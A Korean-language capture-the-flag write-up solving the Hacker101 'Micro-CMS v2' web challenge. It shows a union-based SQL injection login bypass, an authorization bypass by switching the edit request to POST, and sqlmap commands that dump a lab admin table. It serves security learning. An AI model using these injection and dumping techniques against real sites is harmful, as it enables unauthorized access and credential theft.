# Micro-CMS v2

## HINTS

### Flag0 -- Found

* Regular users can only see public pages
* Getting admin access might require a more perfect union
* Knowing the password is cool, but there are other approaches that might be easier

### Flag1 -- Found

* What actions could you perform as a regular user on the last level, which you can't now?
* Just because request fails with one method doesn't mean it will fail with a different method
* Different requests often have different required authorization

### Flag2 -- Found

* Credentials are secret, flags are secret. Coincidence?

## FLAG0

일반적인 유저가 아니라 admin권한을 획득해야 볼 수 있는 페이지가 있는듯 하다.

`Create New`를 클릭하면 login창이 뜨는것을 확인 할 수 있고 sql injection을 통해 우회가 가능하다.

이때 DBMS를 확인하기 위해 먼저 주석의 구분을 지었는데 주석으로 `--` 을 써주면 python Error가 뜨며 구문을 확인 할 수 있다.

**input : `' --`**

```python
Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1")
```

이 에러메세지를 통해 DBMS는 MySQL이며 구문은 `SELECT password FROM admins WHERE username=\'%s\''`이라는것을 알 수 있다. 즉 해당 username으로 부터 password를 꺼내오는 것이기 때문에 union을 통해 가상의 유저를 생성해내면 우회가 가능하다.

**input : `' union select 1 #`**

username부분에 위와 같이 입력후 password를 1이라고 입력하면 성공적으로 Login이 되며 Private Page를 확인 할 수 있다.

## FLAG1

flag1은 다시 admin권한이 없는 guest유저가 할 수 없는 edit페이지에 입장권한을 찾는일이다. FLAG0를 풀기위해 했던 login을 다시 logout하고 edit페이지에 들어가려하면 다시 login창이 뜬다. 하지만 우리가 페이지에 접근할때 사용하는 메소드는 GET뿐만이 아니다.

### Http Methods

HTTP는 주어진 리소스에 필요한 액션이 수행되게 하는 **요청 메소드** 집합을 정의합니다. 물론 명사로도 쓰일 수 있지만, 이 요청 메소드들을 종종 _HTTP 동사로_ 부릅니다. 각각은 서로 다른 구문을 구현하지만, 일부 공통 기능은 공유합니다. 예를 들어서 요청 메소드는 safe, idempotent, 또는 cacheable합니다.

* `GET`

  `GET` 메소드는 특정 리소스의 표시를 요청합니다. `GET`을 사용하는 요청은 오직 데이터를 받기만 합니다.

* `HEAD`

  `HEAD` 메소드는 `GET` 메소드의 요청과 동일한 응답을 요구하지만, 응답 본문을 포함하지 않습니다.

* `POST`

  `POST` 메소드는 특정 리소스에 엔티티를 제출할 때 쓰입니다. 이는 종종 서버의 상태의 변화나 부작용을 일으킵니다.

* `PUT`

  `PUT` 메소드는 목적 리소스 모든 현재 표시를 요청 payload로 바꿉니다.

* `DELETE`

  `DELETE` 메소드는 특정 리소스를 삭제합니다.

* `CONNECT`

  `CONNECT` 메소드는 목적 리소스로 식별되는 서버로의 터널을 맺습니다.

* `OPTIONS`

  `OPTIONS` 메소드는 목적 리소스의 통신을 설정하는 데 쓰입니다.

* `TRACE`

  `TRACE` 메소드는 목적 리소스의 경로를 따라 메시지 loop-back 테스트를 합니다.

* `PATCH`

  `PATCH` 메소드는 리소스의 부분만을 수정하는 데 쓰입니다.

Source : [https://developer.mozilla.org/ko/docs/Web/HTTP/Methods](https://developer.mozilla.org/ko/docs/Web/HTTP/Methods)

### OPTIONS

먼저 페이지에 options패킷을 날려서 해당페이지가 Allow하고 있는 메소드들을 확인한다.

```python
import requests as req

r = req.options("http://35.190.155.168/1aeb93f839/page/edit/2")
print(r.headers["Allow"])

#OUTPUT : HEAD, GET, POST, OPTIONS
```

Allow하는 메소드는 총4가지로 `GET,POST,OPTIONS,HEAD` 인것을 확인할 수 있다. 여기서 GET,OPTIONS,HEAD를 제외하면 `POST`하나가 남는다. POST패킷을 날려서 확인해보자.

```python
import requests as req

r = req.post("http://35.190.155.168/1aeb93f839/page/edit/2")
print(r.text)
#OUTPUT : ^FLAG^*****************$FLAG$
```

로그인하지 않은상태로 edit페이지에 post로 접근하자 flag를 반환해주는것을 확인 할 수 있다.

## FLAG2

flag2는 flag1처럼 가상의 유저를 생성하는게 아닌 실제 유저를 찾아내라는 문제이다.

즉, sql injection을 통해 직접 DB를 DUMP해야 하는 문제이다. 어차피 이 사이트는 sql injection이 그대로 먹히므로 그냥 `sqlmap`으로 풀기로 하였다.

### Get Tables

```bash
❯ sqlmap -u "http://35.190.155.168/1aeb93f839/login" -data "username=admi&password=dsfdsf" --tables


Database: level2
[2 tables]
+----------------------------------------------------+
| admins                                             |
| pages                                              |
+----------------------------------------------------+
```

Sqlmap으로 --tables옵션을 붙여주면 table목록을 덤프떠준다.

### DUMP - admins

딱봐도 admin계정정보가 담겨있을거같은 admins테이블을 덤프떠본다.

```bash
❯ sqlmap -u "http://35.190.155.168/1aeb93f839/login" -data "username=admi&password=dsfdsf" -D level2 -T admins --dump

Database: level2
Table: admins
[1 entry]
+----+----------+----------+
| id | password | username |
+----+----------+----------+
| 1  | berry    | mirna    |
+----+----------+----------+
```

* `-D` 옵션으로 데이터베이스를 지정해주고 
* `-T` 옵션으로 덤프뜰 테이블을 지정해준뒤
* `--dump` 옵션으로 해당테이블을 덤프해준다.

덤프를 통해 확인된 계정으로 로그인하면 flag를 띄워준다.

